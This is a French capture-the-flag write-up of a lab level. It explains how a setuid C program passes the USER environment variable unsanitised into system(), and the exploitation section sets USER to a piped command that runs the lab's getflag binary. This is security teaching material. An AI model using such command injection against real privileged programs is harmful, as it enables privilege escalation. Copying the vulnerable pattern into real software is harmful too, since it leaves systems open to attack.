# Challenge 02

Rappel de C: `int asprintf(char **strp, const char *fmt, ...)` alloue un tampon de la bonne taille avec `malloc`, y écrit la chaine formatée puis écrit l'adresse de ce nouveau buffer dans une variable que l'on lui donne. 

On a le code source du challenge :
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
```bash
drwxr-x--- 2 flag02 level02   80 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag02 flag02   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag02 flag02  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag02 level02 7438 2011-11-20 21:22 flag02
-rw-r--r-- 1 flag02 flag02   675 2011-05-18 02:54 .profile
```
Fonctionnement du chall:
1. On définit le GID effectif,réel et saved au GID de l'utilisateur qui **possède** le programme.
2. On définit le UID effectif,réel et saved au UID de l'utilisateur qui **possède** le programme.
3. Initialise le pointeur à NULL
4. Ecrit à l'emplacement `buffer` la ligne `/bin/echo $USER is cool`.
5. Affiche la commande qui va être executée.
6. Lance la commande

### Exploitation
C'est une injection de commande basique.
1. On injecte la valeur de `USER` que l'on peut modifier : `export USER='|/bin/getflag'`

Bingo on a le flag !